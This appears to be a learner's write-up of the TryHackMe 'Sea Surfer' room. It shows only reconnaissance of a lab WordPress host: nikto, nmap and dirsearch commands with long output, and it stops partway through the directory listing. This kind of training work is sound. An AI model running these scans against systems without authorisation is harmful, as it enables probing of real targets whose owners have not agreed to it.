<h1 align="center">Sea Surfer</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/65646d1b-002b-4dbb-bd9f-4b240f90f042"><br>
2025, September 18<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>483</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Ride the Wave!</em>.<br>
Access it <a href="https://tryhackme.com/room/seasurfer"</a>here.<br>
<img width="1200px" src=" "></p>


<br>
<h2>Task 1 . Let´s go!</h2>
<p>It's a beautiful day to hit the beach and do some surfing.<br>

<em>Please allow up to 5 minutes for the machine to boot up.</em></p>

<p><em>Answer the questions below</em></p>


<h2 align="center">Vulnerability Scanning</h2>
<p align="center"> Uncommon header 'x-backend-server' found, with contents: <code>seasurfer.thm</code></p>

```bash
:~/SeaSurfer# nikto -h xx.xxx.xx.xx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    ip-xx-xxx-xx-xx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-09-28 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5dcde2b3f2ff9 
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'x-backend-server' found, with contents: seasurfer.thm
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-09-28 xx:xx:xx (GMT1) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2 align="center">Host Resolution</h2>

```bash
xx.xxx.xx.xxx seasurfer.thm
```

<br>
<h2 align="center">Port Scanning</h2>
<p align="center">22 : SSH<br>80 : HTTP : Apache 2.4.29<br>2222 : EtherNet/IP : EtherNetIP-1?<br>8022 : SSH : OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal</p>

```bash
:~/SeaSurfer# nmap -sC -sV -Pn -p- -T4 seasurfer.thm
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.9.3
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea Surfer &#8211; Ride the Wave!
```

<h2 align="center">Directory and File Enumeration</h2>

```bash
root@ip-10-201-116-114:~/SeaSurfer# dirsearch -u http://seasurfer.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -e php,html,txt -x 301,302,404,405,409 --max-recursion-depth=2 --random-agent --full-url

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 877

Output File: /root/SeaSurfer/reports/http_seasurfer.thm/_25-09-29_00-11-19.txt

Target: http://seasurfer.thm/

[00:11:19] Starting: 
[00:11:20] 200 -    7KB - http://seasurfer.thm/license.txt
[00:11:20] 200 -    2B  - http://seasurfer.thm/wp-admin/admin-footer.php
[00:11:20] 500 -    0B  - http://seasurfer.thm/wp-admin/admin-header.php
[00:11:20] 400 -    1B  - http://seasurfer.thm/wp-admin/admin-ajax.php
[00:11:20] 500 -    0B  - http://seasurfer.thm/wp-admin/admin-functions.php
[00:11:20] 200 -    6KB - http://seasurfer.thm/wp-admin/css/dashboard-rtl.css
[00:11:20] 200 -  280B  - http://seasurfer.thm/wp-admin/css/farbtastic-rtl.css
[00:11:20] 200 -  258B  - http://seasurfer.thm/wp-admin/css/farbtastic.css
[00:11:20] 200 -    0B  - http://seasurfer.thm/wp-admin/admin-post.php
[00:11:20] 200 -    2KB - http://seasurfer.thm/wp-admin/css/install.css
[00:11:20] 200 -    2KB - http://seasurfer.thm/wp-admin/css/install-rtl.css
[00:11:20] 200 -    2KB - http://seasurfer.thm/wp-admin/css/login.css
[00:11:20] 200 -    2KB - http://seasurfer.thm/wp-admin/css/login-rtl.css
[00:11:20] 200 -    5KB - http://seasurfer.thm/wp-admin/css/media.css
[00:11:20] 200 -    5KB - http://seasurfer.thm/wp-admin/css/media-rtl.css
[00:11:20] 403 -  278B  - http://seasurfer.thm/wp-admin/css/
[00:11:21] 200 -    4KB - http://seasurfer.thm/wp-admin/css/widgets.css
[00:11:21] 200 -    4KB - http://seasurfer.thm/wp-admin/css/widgets-rtl.css
[00:11:21] 200 -  147B  - http://seasurfer.thm/wp-admin/css/wp-admin.css
[00:11:21] 200 -  174B  - http://seasurfer.thm/wp-admin/css/wp-admin-rtl.css
[00:11:21] 500 -    0B  - http://seasurfer.thm/wp-admin/custom-background.php
[00:11:21] 500 -    0B  - http://seasurfer.thm/wp-admin/custom-header.php
[00:11:21] 200 -    3KB - http://seasurfer.thm/readme.html
[00:11:21] 200 -    2B  - http://seasurfer.thm/wp-admin/edit-form-advanced.php
[00:11:21] 200 -    2B  - http://seasurfer.thm/wp-admin/edit-form-comment.php
[00:11:21] 200 -    2B  - http://seasurfer.thm/wp-admin/edit-link-form.php
[00:11:21] 200 -    2B  - http://seasurfer.thm/wp-admin/edit-tag-form.php
[00:11:21] 403 -  278B  - http://seasurfer.thm/wp-admin/images/
[00:11:21] 200 -  546B  - http://seasurfer.thm/wp-admin/images/align-center.png
[00:11:21] 200 -  554B  - http://seasurfer.thm/wp-admin/images/align-left.png
[00:11:21] 200 -  417B  - http://seasurfer.thm/wp-admin/images/align-none.png
[00:11:21] 200 -  509B  - http://seasurfer.thm/wp-admin/images/align-right.png
[00:11:21] 200 -  398B  - http://seasurfer.thm/wp-admin/images/bubble_bg.gif
[00:11:21] 200 -  114B  - http://seasurfer.thm/wp-admin/images/comment-grey-bubble.png
[00:11:21] 200 -  400B  - http://seasurfer.thm/wp-admin/images/date-button.gif
[00:11:22] 200 -  719B  - http://seasurfer.thm/wp-admin/images/generic.png
[00:11:22] 200 -    8KB - http://seasurfer.thm/wp-admin/images/icons32.png
[00:11:22] 200 - 1003B  - http://seasurfer.thm/wp-admin/images/list.png
[00:11:22] 200 -    4KB - http://seasurfer.thm/wp-admin/images/imgedit-icons.png
[00:11:22] 200 -    8KB - http://seasurfer.thm/wp-admin/images/icons32-vs.png
[00:11:22] 200 -    1KB - http://seasurfer.thm/wp-admin/images/loading.gif
[00:11:22] 200 -  360B  - http://seasurfer.thm/wp-admin/images/marker.png
[00:11:22] 200 -    2KB - http://seasurfer.thm/wp-admin/images/mask.png
[00:11:22] 200 -  200B  - http://seasurfer.thm/wp-admin/images/media-button-image.gif
[00:11:22] 200 -  206B  - http://seasurfer.thm/wp-admin/images/media-button-music.gif
[00:11:22] 200 -  248B  - http://seasurfer.thm/wp-admin/images/media-button-other.gif
[00:11:22] 200 -  133B  - http://seasurfer.thm/wp-admin/images/media-button-video.gif
[00:11:22] 200 -    5KB - http://seasurfer.thm/wp-admin/images/menu.png
[00:11:22] 200 -    5KB - http://seasurfer.thm/wp-admin/images/menu-vs.png
[00:11:22] 200 -  755B  - http://seasurfer.thm/wp-admin/images/no.png
[00:11:22] 200 -   64B  - http://seasurfer.thm/wp-admin/images/resize.gif
[00:11:22] 200 -  120B  - http://seasurfer.thm/wp-admin/images/se.png
[00:11:22] 200 -    6KB - http://seasurfer.thm/wp-admin/images/wheel.png
[00:11:22] 200 -    2KB - http://seasurfer.thm/wp-admin/images/wordpress-logo.png
[00:11:23] 200 -  181B  - http://seasurfer.thm/wp-admin/images/xit.gif
[00:11:23] 200 -  539B  - http://seasurfer.thm/wp-admin/images/yes.png
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/images/wpspin_light.gif
[00:11:23] 403 -  278B  - http://seasurfer.thm/wp-admin/includes/
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/admin.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/bookmark.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-ftp-pure.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/class-pclzip.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-filesystem-base.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-filesystem-direct.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-filesystem-ftpext.php
[00:11:23] 200 -    6KB - http://seasurfer.thm/wp-admin/css/dashboard.css
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-filesystem-ftpsockets.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/comment.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/continents-cities.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/dashboard.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/deprecated.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/import.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/media.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/image.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/misc.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/export.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/meta-boxes.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/ms-deprecated.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/ms.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/post.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/plugin-install.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/plugin.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/schema.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/class-ftp.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-filesystem-ssh2.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/nav-menu.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/template.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-importer.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-ftp-sockets.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/theme-install.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/theme.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/upgrade.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/user.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/update-core.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/update.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/widgets.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/class-wp-upgrader.php
[00:11:23] 500 -    0B  - http://seasurfer.thm/wp-admin/includes/file.php
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/image-edit.php
[00:11:23] 200 -    1KB - http://seasurfer.thm/wp-admin/js/custom-background.js
[00:11:23] 200 -   14KB - http://seasurfer.thm/wp-admin/js/common.js
[00:11:23] 200 -    0B  - http://seasurfer.thm/wp-admin/includes/taxonomy.php
[00:11:23] 403 -  278B  - http://seasurfer.thm/wp-admin/js/
[00:11:23] 200 -    8KB - http://seasurfer.thm/wp-admin/js/dashboard.js
[00:11:23] 200 -   10KB - http://seasurfer.thm/wp-admin/js/edit-comments.js
[00:11:23] 200 -   12KB - http://seasurfer.thm/wp-admin/js/editor.js
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/js/farbtastic.js
[00:11:23] 200 -    1KB - http://seasurfer.thm/wp-admin/js/comment.js
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/js/gallery.js
[00:11:23] 200 -    8KB - http://seasurfer.thm/wp-admin/js/image-edit.js
[00:11:23] 200 -    5KB - http://seasurfer.thm/wp-admin/js/inline-edit-post.js
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/js/inline-edit-tax.js
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/js/link.js
[00:11:23] 200 -    2KB - http://seasurfer.thm/wp-admin/js/media.js
[00:11:24] 200 -  509B  - http://seasurfer.thm/wp-admin/install.php
[00:11:24] 200 -    1KB - http://seasurfer.thm/wp-admin/js/media-upload.js
[00:11:24] 200 -    1KB - http://seasurfer.thm/wp-admin/js/password-strength-meter.js
[00:11:24] 200 -    3KB - http://seasurfer.thm/wp-admin/js/plugin-install.js
[00:11:24] 200 -    5KB - http://seasurfer.thm/wp-admin/js/postbox.js
[00:11:24] 200 -   12KB - http://seasurfer.thm/wp-admin/js/post.js
[00:11:24] 200 -   13KB - http://seasurfer.thm/wp-admin/js/nav-menu.js
[00:11:24] 200 -    2KB - http://seasurfer.thm/wp-admin/js/tags.js
[00:11:24] 200 -  487B  - http://seasurfer.thm/wp-admin/js/set-post-thumbnail.js
[00:11:24] 200 -    0B  - http://seasurfer.thm/wp-admin/install-helper.php
[00:11:24] 200 -    4KB - http://seasurfer.thm/wp-admin/js/user-profile.js
[00:11:24] 200 -    6KB - http://seasurfer.thm/wp-admin/js/widgets.js
[00:11:24] 200 -    2KB - http://seasurfer.thm/wp-admin/js/word-count.js
[00:11:24] 200 -  404B  - http://seasurfer.thm/wp-admin/js/xfn.js
[00:11:24] 200 -    0B  - http://seasurfer.thm/wp-admin/link-parse-opml.php
[00:11:24] 200 -    0B  - http://seasurfer.thm/wp-admin/load-scripts.php
[00:11:24] 200 -    0B  - http://seasurfer.thm/wp-admin/load-styles.php
[00:11:24] 403 -  278B  - http://seasurfer.thm/wp-admin/maint/
[00:11:24] 500 -    0B  - http://seasurfer.thm/wp-admin/menu-header.php
[00:11:24] 500 -    0B  - http://seasurfer.thm/wp-admin/menu.php
[00:11:25] 500 -    0B  - http://seasurfer.thm/wp-admin/options-head.php
[00:11:25] 200 -  581B  - http://seasurfer.thm/wp-admin/maint/repair.php
[00:11:25] 500 -    0B  - http://seasurfer.thm/wp-admin/upgrade-functions.php
[00:11:25] 200 -    0B  - http://seasurfer.thm/wp-content/
[00:11:25] 200 -    0B  - http://seasurfer.thm/wp-content/index.php
[00:11:25] 500 -    2KB - http://seasurfer.thm/wp-config-sample.php
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/admin.php
[00:11:25] 200 -    0B  - http://seasurfer.thm/wp-content/plugins/
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/akismet.gif
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/akismet.php
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/readme.txt
[00:11:25] 403 -  278B  - http://seasurfer.thm/wp-content/plugins/akismet/legacy.php
[00:11:25] 500 -    0B  - http://seasurfer.thm/wp-content/plugins/hello.php
[00:11:25] 200 -    0B  - http://seasurfer.thm/wp-content/themes/
[00:11:25] 200 -    0B  - http://seasurfer.thm/wp-content/plugins/index.php
[00:11:26] 403 -    0B  - http://seasurfer.thm/wp-app.php
[00:11:26] 200 -  494B  - http://seasurfer.thm/wp-admin/upgrade.php
[00:11:26] 200 -    0B  - http://seasurfer.thm/wp-content/themes/index.php
[00:11:27] 403 -  278B  - http://seasurfer.thm/wp-includes/
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/atomlib.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/author-template.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/bookmark.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/bookmark-template.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/cache.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/canonical.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/capabilities.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/category-template.php
[00:11:27] 200 -    0B  - http://seasurfer.thm/wp-includes/category.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/class-feed.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/class-json.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/class-IXR.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/class-http.php
[00:11:27] 500 -    0B  - http://seasurfer.thm/wp-includes/class-oembed.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/class-simplepie.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/class-phpmailer.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/class-phpass.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/class-pop3.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/class.wp-scripts.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/class-smtp.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/class.wp-styles.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/class.wp-dependencies.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/comment.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/cron.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/compat.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/comment-template.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-cron.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/class-snoopy.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/default-filters.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/deprecated.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/default-widgets.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/default-constants.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-atom-comments.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-atom.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/feed.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-rss2.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/functions.wp-scripts.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/formatting.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-rss.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-rdf.php
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/general-template.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/functions.php
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/images/
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/http.php
[00:11:28] 500 -    0B  - http://seasurfer.thm/wp-includes/feed-rss2-comments.php
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/images/crystal/
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/audio.png
[00:11:28] 200 -    0B  - http://seasurfer.thm/wp-includes/functions.wp-styles.php
[00:11:28] 200 -  453B  - http://seasurfer.thm/wp-includes/images/crystal/default.png
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/code.png
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/interactive.png
[00:11:28] 200 -  143B  - http://seasurfer.thm/wp-includes/images/crystal/license.txt
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/spreadsheet.png
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/archive.png
[00:11:28] 200 -  608B  - http://seasurfer.thm/wp-includes/images/rss.png
[00:11:28] 200 -    1KB - http://seasurfer.thm/wp-includes/images/crystal/video.png
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/crystal/document.png
[00:11:28] 200 -  670B  - http://seasurfer.thm/wp-includes/images/crystal/text.png
[00:11:28] 200 -  172B  - http://seasurfer.thm/wp-includes/images/smilies/icon_cool.gif
[00:11:28] 200 -  412B  - http://seasurfer.thm/wp-includes/images/smilies/icon_cry.gif
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/images/smilies/
[00:11:28] 200 -  170B  - http://seasurfer.thm/wp-includes/images/smilies/icon_eek.gif
[00:11:28] 200 -  236B  - http://seasurfer.thm/wp-includes/images/smilies/icon_exclaim.gif
[00:11:28] 200 -  169B  - http://seasurfer.thm/wp-includes/images/smilies/icon_arrow.gif
[00:11:28] 200 -  173B  - http://seasurfer.thm/wp-includes/images/smilies/icon_biggrin.gif
[00:11:28] 200 -  170B  - http://seasurfer.thm/wp-includes/images/smilies/icon_confused.gif
[00:11:28] 200 -  167B  - http://seasurfer.thm/wp-includes/images/smilies/icon_neutral.gif
[00:11:28] 200 -  247B  - http://seasurfer.thm/wp-includes/images/smilies/icon_question.gif
[00:11:28] 200 -  348B  - http://seasurfer.thm/wp-includes/images/smilies/icon_mrgreen.gif
[00:11:28] 200 -  193B  - http://seasurfer.thm/wp-includes/images/smilies/icon_evil.gif
[00:11:28] 200 -  645B  - http://seasurfer.thm/wp-includes/images/smilies/icon_redface.gif
[00:11:28] 200 -  331B  - http://seasurfer.thm/wp-includes/images/smilies/icon_lol.gif
[00:11:28] 200 -  471B  - http://seasurfer.thm/wp-includes/images/smilies/icon_rolleyes.gif
[00:11:28] 200 -  174B  - http://seasurfer.thm/wp-includes/images/smilies/icon_surprised.gif
[00:11:28] 200 -  173B  - http://seasurfer.thm/wp-includes/images/smilies/icon_smile.gif
[00:11:28] 200 -  167B  - http://seasurfer.thm/wp-includes/images/smilies/icon_sad.gif
[00:11:28] 200 -  174B  - http://seasurfer.thm/wp-includes/images/smilies/icon_idea.gif
[00:11:28] 200 -  241B  - http://seasurfer.thm/wp-includes/images/smilies/icon_twisted.gif
[00:11:28] 200 -   43B  - http://seasurfer.thm/wp-includes/images/blank.gif
[00:11:28] 200 -  168B  - http://seasurfer.thm/wp-includes/images/smilies/icon_wink.gif
[00:11:28] 200 -  664B  - http://seasurfer.thm/wp-includes/images/wlw/wp-icon.png
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/images/wlw/wp-watermark.png
[00:11:28] 200 -    1KB - http://seasurfer.thm/wp-includes/images/wlw/wp-comments.png
[00:11:28] 200 -  175B  - http://seasurfer.thm/wp-includes/images/smilies/icon_razz.gif
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/js/
[00:11:28] 200 -    6KB - http://seasurfer.thm/wp-includes/js/autosave.js
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/images/wlw/
[00:11:28] 200 -  172B  - http://seasurfer.thm/wp-includes/images/smilies/icon_mad.gif
[00:11:28] 200 -    8KB - http://seasurfer.thm/wp-includes/js/colorpicker.js
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/js/crop/
[00:11:28] 200 -    5KB - http://seasurfer.thm/wp-includes/js/crop/cropper.js
[00:11:28] 200 -  293B  - http://seasurfer.thm/wp-includes/js/crop/marqueeVert.gif
[00:11:28] 200 -    4KB - http://seasurfer.thm/wp-includes/js/comment-reply.js
[00:11:28] 200 -  993B  - http://seasurfer.thm/wp-includes/js/crop/cropper.css
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/js/imgareaselect/
[00:11:28] 200 -  178B  - http://seasurfer.thm/wp-includes/js/imgareaselect/border-anim-h.gif
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/js/jcrop/
[00:11:28] 200 -    9KB - http://seasurfer.thm/wp-includes/js/imgareaselect/jquery.imgareaselect.js
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/js/hoverIntent.js
[00:11:28] 200 -  178B  - http://seasurfer.thm/wp-includes/js/imgareaselect/border-anim-v.gif
[00:11:28] 200 -  265B  - http://seasurfer.thm/wp-includes/js/imgareaselect/imgareaselect.css
[00:11:28] 403 -  278B  - http://seasurfer.thm/wp-includes/js/jquery/
[00:11:28] 200 -  277B  - http://seasurfer.thm/wp-includes/js/crop/marqueeHoriz.gif
[00:11:28] 200 -  323B  - http://seasurfer.thm/wp-includes/js/jcrop/Jcrop.gif
[00:11:28] 200 -   13KB - http://seasurfer.thm/wp-includes/js/jquery/jquery.form.js
[00:11:28] 200 -    1KB - http://seasurfer.thm/wp-includes/js/jquery/jquery.table-hotkeys.js
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/js/jquery/jquery.hotkeys.js
[00:11:28] 200 - 1018B  - http://seasurfer.thm/wp-includes/js/jquery/jquery.schedule.js
[00:11:28] 200 -    2KB - http://seasurfer.thm/wp-includes/js/jquery/suggest.js
[00:11:28] 200 -    5KB - http://seasurfer.thm/wp-includes/js/json2.js
[00:11:28] 200 -    6KB - http://seasurfer.thm/wp-includes/js/quicktags.js
[00:11:29] 200 -  282KB - http://seasurfer.thm/wp-includes/js/jquery/jquery.js
[00:11:29] 200 -    4KB - http://seasurfer.thm/wp-includes/js/swfobject.js
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/swfupload/
[00:11:29] 200 -  596B  - http://seasurfer.thm/wp-includes/js/swfupload/handlers.js
[00:11:29] 200 -    1KB - http://seasurfer.thm/wp-includes/js/swfupload/swfupload.js
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/thickbox/
[00:11:29] 200 -   94B  - http://seasurfer.thm/wp-includes/js/thickbox/macFFBgHack.png
[00:11:29] 200 -   15KB - http://seasurfer.thm/wp-includes/js/thickbox/loadingAnimation.gif
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/
[00:11:29] 200 -    4KB - http://seasurfer.thm/wp-includes/js/thickbox/thickbox.js
[00:11:29] 200 -  939B  - http://seasurfer.thm/wp-includes/js/thickbox/thickbox.css
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/langs/
[00:11:29] 200 -    5KB - http://seasurfer.thm/wp-includes/js/tinymce/langs/wp-langs-en.js
[00:11:29] 200 -    9KB - http://seasurfer.thm/wp-includes/js/tinymce/license.txt
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/directionality/
[00:11:29] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/fullscreen/
[00:11:30] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/media/
[00:11:30] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/paste/
[00:11:30] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/tabfocus/
[00:11:30] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/wordpress/
[00:11:31] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/wpeditimage/
[00:11:31] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/plugins/wpgallery/
[00:11:31] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/themes/
[00:11:31] 200 -    5KB - http://seasurfer.thm/wp-includes/js/tinymce/tiny_mce_popup.js
[00:11:31] 403 -  278B  - http://seasurfer.thm/wp-includes/js/tinymce/utils/
[00:11:31] 200 -  815B  - http://seasurfer.thm/wp-includes/js/tinymce/utils/editable_selects.js
[00:11:31] 200 -    2KB - http://seasurfer.thm/wp-includes/js/tinymce/utils/form_utils.js
[00:11:31] 200 -    2KB - http://seasurfer.thm/wp-includes/js/tinymce/utils/validate.js
[00:11:31] 200 -    1KB - http://seasurfer.thm/wp-includes/js/tinymce/utils/mctabs.js
[00:11:31] 200 -    2KB - http://seasurfer.thm/wp-includes/js/tw-sack.js
[00:11:31] 200 -    1KB - http://seasurfer.thm/wp-includes/js/wp-ajax-response.js
[00:11:32] 200 -  461B  - http://seasurfer.thm/wp-includes/js/wp-list-revisions.js
[00:11:32] 200 -    5KB - http://seasurfer.thm/wp-includes/js/wp-lists.js
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/l10n.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/link-template.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/load.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/kses.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/locale.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/media.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/meta.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/ms-default-filters.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/ms-default-constants.php
[00:11:32] 200 -    0B  - http://seasurfer.thm/wp-includes/ms-deprecated.php
[00:11:32] 500 -    0B  - http://seasurfer.thm/wp-includes/ms-blogs.php
